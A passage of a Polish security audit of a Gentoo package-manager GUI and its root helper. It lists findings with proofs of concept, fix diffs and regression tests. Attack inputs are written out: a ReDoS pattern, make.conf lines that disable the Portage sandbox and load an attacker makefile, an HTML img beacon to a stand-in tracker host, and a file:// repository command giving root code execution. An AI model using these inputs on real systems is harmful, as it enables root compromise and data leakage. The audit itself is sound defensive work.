1. `append_line` wpisuje do `/etc/portage/package.use` linię złożoną z 60 znaków `a` (treść linii w plikach `package.*` nie jest w ogóle sprawdzana — patrz GS-10).
2. `replace_line` z `match = "^(a+)+$"` — 7 znaków, daleko poniżej `PATTERN_MAX = 256`.
3. `re.compile` i `matcher.search` w `op_replace_line` wchodzą w wykładnicze nawroty. Proces roota zostaje przy 100% CPU. Interfejs po 180 s (`helper_client.TIMEOUT_SECONDS`) zabija `pkexec`, ale **nie** helpera — ten jest wnukiem działającym jako root, a użytkownik nie może wysłać mu sygnału.

**Dowód** (PoC, czas wobec długości linii w pliku):

```
pattern: ^(a+)+$ len 7 PATTERN_MAX 256
  18 znaków wejścia ->   0.01 s
  20 znaków wejścia ->   0.03 s
  22 znaków wejścia ->   0.10 s
  24 znaków wejścia ->   0.41 s
  26 znaków wejścia ->   1.61 s
  28 znaków wejścia ->   6.71 s
```

Podwojenie co dwa znaki. 40 znaków to godziny, 60 to praktycznie nieskończoność.

**Skutek:** nieusuwalny proces roota zużywający rdzeń, powtarzalny dowolną liczbę razy. Komentarz
przy `PATTERN_MAX` sam to przewiduje („a pattern crafted to backtrack for ever would hang this
process — as root — until somebody killed it") i nazywa limit długości „a bound, not a cure". Kura
jest jednak dostępna i tania: helper nie potrzebuje ogólnego regexu.

**Obalenie, którego próbowałem:** czy `PATTERN_MAX` nie wystarcza? Nie — 7 znaków starczy.
Czy wzorzec musi pochodzić z żądania? Nie: jedyne dwa miejsca, które go budują, to
`core/makeconf.py:298` (`rf"^\s*{re.escape(name)}="`) i `core/confedit.py:127`
(`rf"^\s*{re.escape(cp)}(\s|$)"`). Oba to szablon plus jeden literał.

**Poprawka** — przenieść budowę wzorca do helpera, gdzie i tak zapada decyzja:

```diff
@@ def op_replace_line
-    pattern = _string(request, "match")
-    if len(pattern) > PATTERN_MAX:
-        raise HelperError(
-            "bad_pattern", f"the match pattern is longer than {PATTERN_MAX} characters"
-        )
-    try:
-        matcher = re.compile(pattern)
-    except re.error as exc:
-        raise HelperError("bad_pattern", f"{pattern!r} is not a valid pattern: {exc}") from exc
+    # Wzorzec buduje ten program, z literału podanego przez wołającego. Interfejs
+    # i tak wysyłał tylko dwa kształty (core/makeconf.py, core/confedit.py), a
+    # ogólny regex uruchamiany jako root nie ma w standardowej bibliotece limitu
+    # czasu — 7-znakowe "^(a+)+$" na 60-znakowej linii nie kończy się nigdy.
+    subject = _string(request, "match_literal")
+    if len(subject) > PATTERN_MAX:
+        raise HelperError("bad_pattern", f"the literal is longer than {PATTERN_MAX} characters")
+    kind = _string(request, "match_kind")
+    if kind == "assignment":          # make.conf: NAME=
+        pattern = rf"^\s*{re.escape(subject)}="
+    elif kind == "entry":             # package.*: cat/pkg na początku linii
+        pattern = rf"^\s*{re.escape(subject)}(\s|$)"
+    else:
+        raise HelperError("bad_pattern", "match_kind must be 'assignment' or 'entry'")
+    matcher = re.compile(pattern)
```

(`match` zostawić na jeden cykl wydawniczy jako odrzucany z `bad_pattern`, żeby starszy interfejs
dostał zrozumiałą odmowę, a nie `bad_request`.)

**Test regresyjny:**

```python
def test_replace_line_no_longer_takes_a_regular_expression(portage):
    """Wzorzec z żądania to nieprzerywalna pętla w procesie roota."""
    target = portage / "package.use"
    target.write_text("media-video/mpv " + "a" * 40 + "\n", encoding="utf-8")
    answer = call("replace_line", path=str(target), line="x/y flag", match="^(a+)+$")
    assert answer["code"] == "bad_pattern"


def test_replace_line_builds_the_pattern_itself(portage):
    target = portage / "make.conf"
    target.write_text('USE="X"\nMAKEOPTS="-j4"\n', encoding="utf-8")
    answer = call("replace_line", path=str(target), line='USE="X wayland"',
                  match_kind="assignment", match_literal="USE")
    assert answer["ok"] and answer["changed"]
```

---

### GS-06 · `FEATURES` i `MAKEOPTS` mieszczą w dozwolonym zestawie znaków wyłączenie sandboksa

**Waga: Wysoka**  **Pewność: wysoka** (akceptacja linii przez helper — PoC; skutek po stronie Portage — z dokumentacji Portage, nieuruchamiany)
**Miejsce:** `gentstore/helper/gentstore_helper.py:131-141` (`MAKE_CONF_VARIABLES`), `:150` (`_MAKE_CONF_VALUE`), `:493-540`
**Napastnik i warunki wstępne:** A. Dwa zatwierdzenia `modify-config`, potem czekanie, aż użytkownik cokolwiek zbuduje.

**Scenariusz:**
1. `append_line` / `replace_line` do `make.conf`: `FEATURES="-sandbox -usersandbox -network-sandbox -userpriv -ipc-sandbox"`.
2. To samo dla `MAKEOPTS="-j1 -f/home/<user>/evil.mk"`.
3. Przy najbliższej instalacji `emake` wykonuje `make ${MAKEOPTS} …`, więc `-f` wskazuje plik
   kontrolowany przez napastnika; `-userpriv` sprawia, że faza `src_compile` biegnie jako root,
   a `-sandbox` zdejmuje ostatnią barierę.

**Dowód** (PoC — co helper przyjmuje):

```
  ACCEPTED : FEATURES="-sandbox -usersandbox -network-sandbox -userpriv -ipc-sandbox"
  ACCEPTED : FEATURES="-strict -webrsync-gpg"
  ACCEPTED : MAKEOPTS="-j1 -f/home/janek/evil.mk"
  ACCEPTED : EMERGE_DEFAULT_OPTS="--root=/tmp/elsewhere"
  refused  : USE="x" # and a comment      -> make_conf_line
  refused  : PORTAGE_BASHRC="/tmp/x"      -> make_conf_line
```

Zestaw znaków `^[A-Za-z0-9 _+=@,./:~*-]*$` zawiera `-`, spację, `/` i `.`, co jest wszystkim,
czego potrzeba do obu linii.

**Skutek:** trwałe wyłączenie zabezpieczeń Portage (sandbox, `userpriv`, `-strict`,
`-webrsync-gpg` czyli weryfikacja podpisów sync-a), a w połączeniu z `MAKEOPTS` — wykonanie kodu
jako root przy najbliższym budowaniu czegokolwiek. Poza tym, co pokazał podgląd, bo napastnik
podgląd omija.

**Obalenie, którego próbowałem:** czy to nie jest w granicach dialogu? Dialog mówi „zmiana plików
w /etc/portage", a to jest zmiana pliku w /etc/portage — ale komentarz przy `MAKE_CONF_VARIABLES`
stawia sprawę inaczej: te dziewięć zmiennych jest tam dlatego, że „decydują, **które pakiety**
zostaną zainstalowane, a nie **co Portage robi**". `FEATURES` tego kryterium nie spełnia i jest na
liście przez przeoczenie własnego uzasadnienia. `MAKEOPTS` jest na niej słusznie, ale bez
ograniczenia wartości.

**Poprawka** — wartość dla tych dwóch zmiennych sprawdzana osobno, po tokenach:

```diff
+#: Tokeny FEATURES, które Gentstore wolno zapisać. Lista tego, co ekran ustawień
+#: oferuje, a nie lista tego, co wygląda groźnie — jak wszędzie indziej w tym pliku.
+_FEATURES_ALLOWED = frozenset({
+    "buildpkg", "ccache", "distcc", "parallel-fetch", "candy", "getbinpkg",
+    "binpkg-multi-instance", "splitdebug", "nostrip", "test",
+})
+#: MAKEOPTS to wiersz poleceń dla make: `-f` podstawia cudzy plik makefile.
+_MAKEOPTS_TOKEN = re.compile(r"^-(?:j|l)\d{1,4}$|^--jobs=\d{1,4}$|^--load-average=[\d.]+$")
+
+def _check_make_conf_value(name: str, value: str) -> None:
+    if name == "FEATURES":
+        for token in value.split():
+            if token.lstrip("-") not in _FEATURES_ALLOWED:
+                raise HelperError(
+                    "make_conf_line",
+                    f"{token!r} w FEATURES nie jest tokenem, który Gentstore pisze; "
+                    "wyłączenie sandbox/userpriv to zmiana, której ten dialog nie zapowiada",
+                )
+    elif name == "MAKEOPTS":
+        for token in value.split():
+            if not _MAKEOPTS_TOKEN.match(token):
+                raise HelperError("make_conf_line", f"{token!r} nie jest opcją zrównoleglenia")
@@ def _check_make_conf_line
     if not _MAKE_CONF_VALUE.match(value):
         raise HelperError(...)
+    _check_make_conf_value(name, value)
```

Kopię tej samej listy trzeba dołożyć do `core/makeconf.py` i porównać ją testem, tak jak już
porównywane są `MAKE_CONF_VARIABLES` ↔ `EDITABLE`.

**Test regresyjny:**

```python
@pytest.mark.parametrize("line", [
    'FEATURES="-sandbox"',
    'FEATURES="-userpriv -usersandbox"',
    'FEATURES="-webrsync-gpg"',
    'MAKEOPTS="-j1 -f/home/user/evil.mk"',
])
def test_make_conf_refuses_values_that_switch_protections_off(portage, line):
    """Te dziewięć zmiennych jest na liście, bo decydują, *które pakiety* wchodzą.
    FEATURES=-sandbox decyduje, co Portage *robi* — to inna zgoda."""
    target = portage / "make.conf"
    target.write_text('USE="X"\n', encoding="utf-8")
    assert call("append_line", path=str(target), line=line)["code"] == "make_conf_line"
    assert target.read_text(encoding="utf-8") == 'USE="X"\n'
```

---

### GS-07 · Podgląd ≠ zapis: `QLabel` w trybie `AutoText` zjada linię zaczynającą się od `<`

**Waga: Średnia**  **Pewność: potwierdzone (PoC)**
**Miejsce:** `gentstore/ui/widgets/write_preview.py:79,206`; `gentstore/ui/widgets/required_changes.py:535,604`; `gentstore/ui/widgets/block_notice.py:339`
**Napastnik i warunki wstępne:** **żaden** — wystarczy zwykły atom z operatorem `<`, który `emerge --autounmask` potrafi wypisać w bloku zmian. Napastnik B może to wywołać celowo.

**Scenariusz:**
1. `emerge --pretend --autounmask` wypisuje blok zmian zawierający linię `<sys-apps/foo-2 ~amd64`.
2. `emerge_parse.RequiredEntry.line` składa ją z atomu i tokenów (`emerge_parse.py:218-220`).
3. `required_changes.py:535` robi `QLabel(entry.line)`, a `write_preview.py:206`
   `self._line.setText(plan.line)`. Żadne z nich nie ustawia formatu tekstu, a `QLabel` domyślnie
   pracuje w `Qt::AutoText` i wywołuje `Qt::mightBeRichText()`.
4. Qt widzi `<sys-apps/…` jako otwarcie nieznanego znacznika i **nie wyświetla nic**.
5. Użytkownik klika „Zapisz" pod pustym podglądem. Do `/etc/portage/package.accept_keywords`
   trafia pełna linia.

**Dowód** (PyQt6 6.11.1, `QTextDocument.setHtml().toPlainText()` — dokładnie to, co robi `QLabel`
w trybie rich text):

```
  do pliku  : '<sys-apps/foo-2 ~amd64'
  na ekranie: ''                          <-- ROZJAZD

  do pliku  : '<media-video/mpv-0.41.0:0 vulkan'
  na ekranie: ''                          <-- ROZJAZD

  do pliku  : '=sys-apps/portage-3.0.66 ~amd64'
  na ekranie: '=sys-apps/portage-3.0.66 ~amd64'
```

W całym `gentstore/ui/` nie ma ani jednego wywołania `setTextFormat`:

```
$ grep -rn "setTextFormat" gentstore/ui | wc -l
0
```

**Skutek:** naruszenie naczelnej zasady projektu — „podgląd → zapis → raport". Użytkownik
zatwierdza linię, której nie zobaczył. To samo dotyczy raportu po zapisie
(`write_preview.py:139,147`), więc ani przed, ani po nie ma miejsca, w którym prawda by się
pokazała.

**Poprawka** — jednoliniowa dla każdego widżetu niosącego tekst spoza tłumaczeń:

```diff
@@ gentstore/ui/widgets/write_preview.py
         self._line = QLabel()
+        # Linia idzie do /etc/portage dosłownie, więc ma się tak samo wyświetlić.
+        # QLabel domyślnie zgaduje (Qt::AutoText): atom "<sys-apps/foo-2" wygląda
+        # dla tego zgadywania jak znacznik HTML i znika z ekranu w całości.
+        self._line.setTextFormat(Qt.TextFormat.PlainText)
         self._line.setTextInteractionFlags(Qt.TextInteractionFlag.TextSelectableByMouse)
@@
         self._path = QLabel()
+        self._path.setTextFormat(Qt.TextFormat.PlainText)
@@
         self._report = QLabel()
+        self._report.setTextFormat(Qt.TextFormat.PlainText)
```

analogicznie `required_changes.py` (`:535` `line`, `:604` `_preview_body`, `:576` `_conflict`,
`:293` `_report`) i `block_notice.py:339` (`setToolTip` — podpowiedzi Qt też są rich-textem).

**Test regresyjny** — `tests/test_search_page.py` albo nowy `tests/test_preview_integrity.py`:

```python
@pytest.mark.parametrize("line", [
    "<sys-apps/foo-2 ~amd64",
    "<=media-video/mpv-0.41.0 vulkan",
    "app-x/y <b>flag</b>",
])
def test_the_preview_shows_exactly_the_bytes_that_will_be_written(qtbot, line):
    """Naczelna zasada: podgląd → zapis. Qt::AutoText zgaduje i czasem zgaduje źle."""
    widget = WritePreview()
    qtbot.addWidget(widget)
    widget.show_plan(WritePlan(op="append_line", path=Path("/etc/portage/package.use"), line=line))
    assert widget._line.text() == line
    assert widget._line.textFormat() == Qt.TextFormat.PlainText
```

---

### GS-08 · Tekst z ebuilda, `metadata.xml` i katalogu overlayów jest renderowany jako HTML

**Waga: Średnia**  **Pewność: potwierdzone (PoC)**
**Miejsce:** `gentstore/ui/pages/search.py:287,593`; `gentstore/ui/widgets/use_flag_row.py:94,262`; `gentstore/ui/pages/repos.py:187,890`; `gentstore/ui/widgets/news_list.py:57`
**Napastnik i warunki wstępne:** B — autor overlaya, którego użytkownik dodał (albo A, który może nadpisać `~/.cache/eselect-repo/repositories.xml`). Nie wymaga żadnego dialogu.

**Scenariusz:**
1. Ebuild w overlayu ma `DESCRIPTION="A tool <img src=\"http://tracker.example/b.png?u=$(id)\"> for things"`
   albo `metadata.xml` ma opis flagi USE z takim samym ładunkiem.
2. `search.py:593` robi `self._description.setText(info.description or …)` na `QLabel`
   bez `setTextFormat`.
3. Qt rozpoznaje to jako rich text i **pobiera obrazek**.

**Dowód:**

```
DESCRIPTION z ebuilda    rendered-as-rich=True
                         na ekranie: 'A tool ￼ for things'
                         w ebuildzie: 'A tool <img src="http://tracker.example/beacon.png"> for things'

podszycie sie pod UI     rendered-as-rich=True
                         na ekranie: 'harmless — Gentstore: ta zmiana jest bezpieczna'
                         w ebuildzie: 'harmless<span style="color:red"> — Gentstore: ta zmiana jest bezpieczna</span>'
```

**Skutek:** dwa, oba wymienione w promptcie §5.4:
- **kanał sieciowy** — `Docs/04-privileges.md §8` obiecuje wprost: *„it does not send data anywhere;
  the only network traffic is `emerge`/`emaint`/`git` run by it"*. `<img src="http://…">` w opisie
  pakietu łamie to obiecanie bez żadnego dialogu i bez śladu w logu poleceń;
- **fałszowanie treści interfejsu** — `<span style>` pozwala dopisać do opisu pakietu zdanie
  wyglądające jak komunikat Gentstore (przykład wyżej). Ten sam mechanizm działa w opisie flagi USE
  i w opisie repozytorium w katalogu.

**Poprawka:** ta sama co w GS-07 —
`setTextFormat(Qt.TextFormat.PlainText)` na każdym `QLabel`, który niesie tekst spoza `self.tr()`.
Warto to zrobić raz, w jednym miejscu, żeby nie trzeba było pamiętać:

```python
# gentstore/ui/widgets/__init__.py
def plain_label(text: str = "") -> QLabel:
    """QLabel, który pokazuje to, co dostał.

    Domyślny Qt::AutoText zgaduje po zawartości, a tekst tu wyświetlany pochodzi
    z ebuildów, metadata.xml i katalogu overlayów — czyli od kogoś, kto może chcieć,
    żeby zgadł inaczej. Docs/04-privileges.md §8 obiecuje brak ruchu sieciowego;
    <img src> w DESCRIPTION łamie to obiecanie w jednym wierszu.
    """
    label = QLabel(text)
    label.setTextFormat(Qt.TextFormat.PlainText)
    return label
```

**Test regresyjny:**

```python
def test_no_untranslated_text_reaches_a_guessing_label(qtbot):
    """Zbiorczy: każdy QLabel w oknie pakietu ma jawny format tekstu."""
    page = SearchPage(context)
    qtbot.addWidget(page)
    page.show_package(PackageInfo(cp="x/y", description='<img src="http://x/">'))
    assert page._description.textFormat() == Qt.TextFormat.PlainText
    assert page._description.text() == '<img src="http://x/">'
```

---

### GS-09 · `eselect repository add` przyjmuje `file://` i nazwę kolidującą z `gentoo`

**Waga: Wysoka**  **Pewność: potwierdzone (PoC) dla bramki; skutek po stronie `eselect` — wysoka**
**Miejsce:** `gentstore/helper/gentstore_launcher.py:157` (`_URI`), `:140` (`_REPOSITORY`), `:240`
**Napastnik i warunki wstępne:** A. Jedno zatwierdzenie `run-emerge`.

`Docs/04-privileges.md §3` przyznaje ogólny problem („`eselect repository add` puts an arbitrary
URL into `repos.conf` and is a larger thing to consent to… a third action… has not been made").
Zgodnie z §7 promptu nie raportuję tej części. Raportuję dwa szczegóły, których przyznanie nie
obejmuje:

**(a) `file://` na katalog kontrolowany przez wołającego.** Napastnik nie potrzebuje nawet sieci:

```
  ACCEPTED eselect repository add evil git file:///home/janek/evil
```

Po `emaint sync -r evil` (też dozwolone, `EMAINT_COMMANDS:252`) i `emerge evil-cat/pkg`
fazy `pkg_setup`/`pkg_preinst`/`pkg_postinst` wykonują się **jako root**. Cały łańcuch to trzy
wywołania launchera i trzy dialogi o treści „instalacja, aktualizacja i usuwanie pakietów".

**(b) Nazwa repozytorium nie jest sprawdzana pod kątem kolizji.**

```
  ACCEPTED eselect repository add gentoo git file:///home/janek/evil
```

`_REPOSITORY = ^[A-Za-z0-9][A-Za-z0-9_+.-]*$` przepuszcza `gentoo`. `eselect repository add`
pisze do `/etc/portage/repos.conf/eselect-repo.conf`, a sekcja o tej samej nazwie w pliku czytanym
później wygrywa — czyli to, co opisuje GS-01, tylko przez drugie drzwi. Okno „Dodaj repozytorium"
też nie blokuje nazwy `gentoo` (`gentstore/ui/widgets/add_overlay_dialog.py:110` —
`is_valid_name(name)` sprawdza tylko kształt), więc użytkownik może to zrobić własnoręcznie,
sądząc, że dodaje coś obok.

**Czego nie potwierdziłem:** czy `eselect repository add` odmawia dla nazwy już istniejącej.
Nie uruchamiam `eselect`. Jeśli odmawia, część (b) spada do „hipotezy"; część (a) stoi niezależnie.

**Skutek:** wykonanie kodu jako root po zatwierdzeniu dialogu mówiącego o instalowaniu pakietów,
bez udziału sieci i bez żadnego zdalnego serwera.

**Poprawka:**

```diff
-_URI = re.compile(r"^(?:https?|git|ssh|rsync|svn|file)://[^\s]+$")
+#: `file://` wskazuje katalog na tej maszynie — w praktyce katalog domowy tego,
+#: kto woła ten program. To nie jest „dodaj cudze repozytorium", to jest
+#: „uruchom moje ebuildy jako root", a dialog mówi „instalacja pakietów".
+_URI = re.compile(r"^(?:https?|git|ssh|rsync|svn)://[^\s]+$")
+
+#: Nazwy, których nowy wpis nie może przejąć: sekcja o tej samej nazwie w pliku
+#: czytanym później nadpisuje definicję repozytorium głównego.
+_RESERVED_REPOSITORIES = frozenset({"gentoo", "DEFAULT"})
@@
 def _is_repository(token: str) -> bool:
-    return bool(_REPOSITORY.match(token))
+    return bool(_REPOSITORY.match(token)) and token not in _RESERVED_REPOSITORIES
```

Ta sama para zmian w `gentstore/core/overlays.py:247` (`_SCHEME`) i w `is_valid_name`, żeby okno
nie włączało przycisku dla czegoś, czego launcher i tak odmówi — test
`test_the_overlay_dialog_and_the_launcher_agree_on_url_schemes` (`tests/test_runner.py:973`)
pilnuje tej zgodności i sam wychwyci rozjazd.

**Test regresyjny:**

```python
def test_the_launcher_refuses_a_repository_on_the_local_disk():
    """file:// to „uruchom moje ebuildy jako root", nie „dodaj cudze repozytorium"."""
    with pytest.raises(launcher.LauncherError):
        launcher.check_arguments(
            "eselect", ["repository", "add", "evil", "git", "file:///home/user/evil"]
        )


def test_the_launcher_refuses_to_shadow_the_main_repository():
    with pytest.raises(launcher.LauncherError):
        launcher.check_arguments(
            "eselect", ["repository", "add", "gentoo", "git", "https://example/x.git"]
        )
```

---

### GS-10 · Treść linii w `package.*` nie jest sprawdzana wcale; `\r` przechodzi tam, gdzie `\n` nie

**Waga: Wysoka** (podniesiona po weryfikacji — patrz sprostowanie niżej)  **Pewność: potwierdzone (PoC)**
**Miejsce:** `gentstore/helper/gentstore_helper.py:758-760` (`op_append_line`), `:612-617` (`_lines`, `_joined`)
**Napastnik i warunki wstępne:** A, jedno zatwierdzenie `modify-config`.

**Trzy osobne konsekwencje jednej decyzji.**

**(a) `\r` łamie obietnicę „dokładnie jedna linia".** `append_line` sprawdza tylko `"\n" in line`,
a `_lines()` to `str.splitlines()`, które dzieli także na `\r`, `\v`, `\f`, `\x1c`, U+2028 i U+0085:

```
  odpowiedz: ok
  bajty w pliku : b'media-video/mpv vulkan\napp-x/y flag\rsys-apps/portage -rsync-verify\n'
  helper._lines(): ['media-video/mpv vulkan', 'app-x/y flag', 'sys-apps/portage -rsync-verify']
  duplikat? drugie append tej samej linii: True
```

Ostatni wiersz to drugi skutek: obietnica „identycznej linii nie duplikujemy" (`Docs §4`) przestaje
działać, bo `line in lines` nigdy nie trafi. W widoku terminala treść po `\r` nadpisuje to, co
przed nim — a `log_view.py:226` robi dokładnie to samo (`rsplit("\r", 1)[-1]`).

**(b) `replace_line` przepisuje `\r` na `\n` w całym pliku.** `Docs §4` obiecuje „leaving the rest
of the file byte for byte (comments and blank lines included)":

```
  przed: b'USE="X"\nCOMMENT_ONE\rCOMMENT_TWO\nMAKEOPTS="-j4"\n'
   ok
  po   : b'USE="X wayland"\nCOMMENT_ONE\nCOMMENT_TWO\nMAKEOPTS="-j4"\n'
```

`_read` używa `read_text` (uniwersalne końce linii), `_lines` dzieli po `splitlines()`, `_joined`
skleja `\n`. Plik z `CRLF` zostanie po cichu przekonwertowany.

**(c) NUL w linii `package.*`.** `make.conf` odrzuca bajt zerowy jawnie (`:508`), pliki `package.*`
nie:

```
   ok 'sys-apps/portage \x00hidden'
```

**Skutek:** rozjazd między tym, co helper mówi, że zrobił (jedna linia, bez duplikatu, reszta
pliku nietknięta), a tym, co jest na dysku.

> **SPROSTOWANIE (dopisane po naprawie).** Pierwotnie napisałem tu: *„Nie prowadzi bezpośrednio
> do roota — Portage dzieli linie `package.*` przez `.split()`, więc `\r` nie przemyci drugiego
> wpisu"*. **To było błędne.** Patrzyłem na `.split()` na poziomie tokenów i przeoczyłem, że
> `portage.util.grablines` otwiera te pliki w trybie universal newlines, więc `readlines()`
> dzieli na `\r` **wcześniej**. Sprawdzone na zainstalowanym Portage:
>
> ```
> bajty w pliku: b'media-video/mpv vulkan\napp-x/y flag\rsys-apps/portage -rsync-verify\n'
> co widzi Portage (grabfile):
>     'media-video/mpv vulkan'
>     'app-x/y flag'
>     'sys-apps/portage -rsync-verify'
> ```
>
> Czyli jedno `append_line`, którego cała umowa brzmi „dokładnie jedna linia", zapisuje **drugi
> wpis konfiguracyjny**, którego podgląd nie pokazał. To nie jest usterka wyświetlania — to jest
> naczelna zasada projektu odwrócona, i to przez kontrolę, której jedynym zadaniem było temu
> zapobiec. Waga powinna brzmieć **Wysoka**, nie Średnia.

**Poprawka:**

```diff
@@ def op_append_line
     line = _string(request, "line").rstrip("\n")
-    if "\n" in line:
+    # splitlines() — czyli to, czym ten program czyta pliki — dzieli także na \r,
+    # \v, \f, U+2028 i U+0085. "Jedna linia" musi znaczyć to samo po obu stronach.
+    if len(line.splitlines()) > 1 or line != line.splitlines()[0] if line else False:
         raise HelperError("multiline", "append_line takes exactly one line")
+    if "\x00" in line:
+        raise HelperError("nul_byte", "a configuration line cannot contain a null byte")
```

czytelniej jako osobna funkcja użyta przez `op_append_line`, `_batch_entries`, `op_replace_line`
i `op_remove_line`:

```python
def _one_line(raw: str, where: str = "") -> str:
    """Dokładnie jedna linia w tym samym sensie, w jakim ten program czyta pliki."""
    line = raw.rstrip("\n")
    if "\x00" in line:
        raise HelperError("nul_byte", f"{where}a configuration line cannot contain a null byte")
    parts = line.splitlines()
    if len(parts) > 1 or (parts and parts[0] != line):
        raise HelperError("multiline", f"{where}exactly one line, and nothing that reads as two")
    return line
```

Dla (b): `_read`/`_joined` powinny zachowywać oryginalne zakończenia linii albo odmawiać na pliku
zawierającym `\r` — pierwsze jest poprawne, drugie prostsze i uczciwsze.

**Test regresyjny:**

```python
@pytest.mark.parametrize("line", [
    "app-x/y flag\rsys-apps/portage -rsync-verify",
    "app-x/y flag sys-apps/portage -rsync-verify",
    "sys-apps/portage \x00hidden",
])
def test_a_line_that_reads_as_two_is_not_one_line(portage, line):
    """`splitlines()` — czym ten program czyta pliki — dzieli na więcej niż \\n."""
    target = portage / "package.use"
    target.write_text("media-video/mpv vulkan\n", encoding="utf-8")
    assert call("append_line", path=str(target), line=line)["ok"] is False
    assert target.read_bytes() == b"media-video/mpv vulkan\n"


def test_replace_line_leaves_the_rest_of_the_file_byte_for_byte(portage):
    """Docs/04-privileges.md §4 — komentarze i puste linie włącznie."""
    target = portage / "make.conf"
    target.write_bytes(b'USE="X"\r\nMAKEOPTS="-j4"\r\n')
    call("replace_line", path=str(target), line='USE="X wayland"',
         match_kind="assignment", match_literal="USE")
    assert target.read_bytes() == b'USE="X wayland"\r\nMAKEOPTS="-j4"\r\n'
```

---

### GS-11 · `glsa-check -f` instaluje pakiety jako root bez potwierdzenia i bez podglądu

**Waga: Niska**  **Pewność: potwierdzone**
**Miejsce:** `gentstore/ui/pages/update.py:385-389`, `gentstore/runner/eselect.py:129-135`
**Napastnik i warunki wstępne:** brak napastnika — to rozjazd z zasadą projektu, nie luka.

`_security_fix.clicked` prowadzi prosto do `self._start("security", eselect.fix_glsa())`, czyli do
`glsa-check -f affected` jako root. `glsa-check -f` wywołuje wewnętrznie `emerge`, więc instaluje
i aktualizuje pakiety — a jest to jedyna uprzywilejowana operacja instalująca w całej aplikacji,
przed którą **nie** pokazuje się lista. Dla porównania: `depclean` ma
`QMessageBox.question` z pełną listą (`update.py:559-581`), usunięcie pakietu idzie przez
`emerge -pv --unmerge` (`Docs §6`), zmiana profilu ma ostrzeżenie (`profile.py:208`).

**Skutek:** użytkownik zatwierdza dialog polkit, nie wiedząc, co zostanie zbudowane ani jak długo
to potrwa. Nie jest to przekroczenie uprawnień — jest to jedyne miejsce, w którym łamana jest
reguła „nic po cichu".

**Poprawka:** przed `fix_glsa()` uruchomić `glsa-check -p affected` (nieuprzywilejowane, wymaga
dopisania wiersza do `_check_glsa_check`) albo pokazać `QMessageBox.question` z listą identyfikatorów
i pakietów, które `glsa-check -l affected` już zwrócił — ta lista jest w pamięci, bo przycisk
pojawia się dopiero po niej.

**Test regresyjny:**

```python
def test_applying_security_fixes_asks_first(qtbot, monkeypatch):
    """Jedyna uprzywilejowana instalacja bez podglądu — Docs/04-privileges.md §6."""
    asked = []
    monkeypatch.setattr(QMessageBox, "question", lambda *a, **k: asked.append(a) or
                        QMessageBox.StandardButton.Cancel)
    page = UpdatePage(context)
    qtbot.addWidget(page)
    page._security_fix.click()
    assert asked, "kliknięcie uruchomiło glsa-check -f bez pytania"
    assert not page._command.is_running()
```

---

### GS-12 · Helper nie odpowiada JSON-em na zagnieżdżony JSON i czyta stdin bez ograniczenia

**Waga: Niska**  **Pewność: potwierdzone (PoC)**
**Miejsce:** `gentstore/helper/gentstore_helper.py:1149-1181` (`main`)

`main` łapie `HelperError`, `json.JSONDecodeError`, `OSError`, `TypeError`, `ValueError`.
`json.loads` na głęboko zagnieżdżonym wejściu rzuca `RecursionError`, który jest podklasą
`RuntimeError` i przez to sito przechodzi:

```
=== deeply nested JSON on stdin ===
  UNCAUGHT RecursionError — no JSON answer at all
```

Komentarz przy ostatniej klauzuli mówi: *„this process is root and its whole contract is »one JSON
answer, always«. A traceback instead of that answer is a worse bug than whatever caused it."*
Dokładnie to się dzieje. Po stronie interfejsu wychodzi z tego `no_answer` z pustym stderr
(`helper_client.py:130-136`).

Osobno: `payload = stdin.read()` nie ma limitu — wołający może wysłać gigabajty do procesu roota.

**Poprawka:**

```diff
+#: Najdłuższe żądanie, jakie ten program przeczyta. Największa partia to
+#: BATCH_MAX linii `package.*`; write_file niesie plik repos.conf. Oba mieszczą
+#: się w ułamku tego. Poza tym: ten proces jest rootem, a stdin wybiera wołający.
+STDIN_MAX = 4 << 20
+
 def main(stdin=None, stdout=None) -> int:
     ...
     try:
-        payload = stdin.read()
+        payload = stdin.read(STDIN_MAX + 1)
+        if len(payload) > STDIN_MAX:
+            print(json.dumps({"ok": False, "code": "too_large",
+                              "error": f"a request is at most {STDIN_MAX} bytes"}), file=stdout)
+            return 2
     except OSError as exc:
         ...
     except (TypeError, ValueError) as exc:
         response = {"ok": False, "code": "bad_request", "error": str(exc)}
+    except RecursionError:
+        # json.loads na zagnieżdżonym wejściu; RuntimeError, więc sito wyżej go nie łapie.
+        response = {"ok": False, "code": "bad_json", "error": "the request is nested too deeply"}
```

**Test regresyjny:**

```python
def test_a_deeply_nested_request_is_a_refusal_not_a_traceback():
    """Kontrakt tego programu to jedna odpowiedź JSON — zawsze."""
    stdout = io.StringIO()
    helper.main(io.StringIO("[" * 200_000 + "]" * 200_000), stdout)
    answer = json.loads(stdout.getvalue())
    assert answer["ok"] is False
    assert answer["code"] == "bad_json"


def test_a_request_larger_than_the_limit_is_refused():
    stdout = io.StringIO()
    helper.main(io.StringIO('{"op":"backup","pad":"' + "x" * (helper.STDIN_MAX) + '"}'), stdout)
    assert json.loads(stdout.getvalue())["code"] == "too_large"
```

---

### GS-13 · `core/overlays.py` czyta `repositories.xml` bez limitu rozmiaru

**Waga: Niska**  **Pewność: potwierdzone (czytanie kodu)**
**Miejsce:** `gentstore/core/overlays.py:183-216` (`parse`)
**Napastnik:** A (plik leży w `~/.cache/eselect-repo/`, zapisywalny przez użytkownika) lub B.

`core/useflags.py:354-360` ma na ten sam problem przemyślaną odpowiedź:

> „ElementTree resolves no external entities, but it does expand entities an internal subset
> defines — so a metadata.xml written to be a decompression bomb would be expanded here…
> A size limit bounds the cheap version of that"

i `METADATA_MAX_BYTES = 1 << 20`. `overlays.parse()` czyta plik tego samego rodzaju, tym samym
parserem, **bez** takiego limitu i bez jakiegokolwiek komentarza na ten temat. Plik pochodzi
z sieci (`eselect repository list`) i leży w katalogu zapisywalnym przez użytkownika.

**Skutek:** zawieszenie/wyczerpanie pamięci procesu GUI (nieuprzywilejowanego). Nic ponad to —
dlatego Niska. Raportuję, bo sąsiedni plik uznał to za warte limitu i komentarza, a ten nie.

**Poprawka:**

```diff
+#: Ten sam próg i ten sam powód co METADATA_MAX_BYTES w core/useflags.py:
+#: ElementTree rozwija encje z wewnętrznego podzbioru, a ten plik przychodzi
+#: z sieci i leży w katalogu, do którego użytkownik może pisać.
+CATALOGUE_MAX_BYTES = 8 << 20
+
 def parse(path: Path) -> Catalogue:
     try:
+        if path.stat().st_size > CATALOGUE_MAX_BYTES:
+            log.warning("Ignoring %s: %d bytes is not a repositories.xml",
+                        path, path.stat().st_size)
+            return Catalogue()
         tree = ElementTree.parse(path)
```

**Test regresyjny** — `tests/test_overlays.py`:

```python
